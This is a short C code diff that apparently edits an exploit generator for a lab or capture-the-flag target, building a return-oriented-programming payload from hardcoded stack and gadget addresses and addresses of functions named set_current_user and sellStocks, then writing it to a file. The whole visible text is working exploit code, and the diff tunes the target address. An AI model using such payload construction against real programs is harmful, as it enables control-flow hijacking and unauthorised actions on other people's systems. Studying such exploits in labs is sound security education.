@@ -26,8 +26,10 @@ int main() {
 		}
 	}
 
+
 	long long savedEbp = 0x7fffffffdeb0;
 	curBuf = insert8Bytes(savedEbp, curBuf);
+
 
 	long long rdpGadget = 0x7FFFF7DE9B6A;
 	curBuf = insert8Bytes(rdpGadget, curBuf);
@@ -38,10 +40,8 @@ int main() {
 	long long set_current_user = 0x555555555289;
 	curBuf = insert8Bytes(set_current_user, curBuf);
 
-	// long long returnMain = 0x555555555686;
-	// curBuf = insert8Bytes(returnMain, curBuf);
 
-	long long sellStocks = 0x5555555552a0;
+	long long sellStocks = 0x5555555552a6;
 	curBuf = insert8Bytes(sellStocks, curBuf );
 
 	fwrite(bigBuffer, 120, 1, fp );
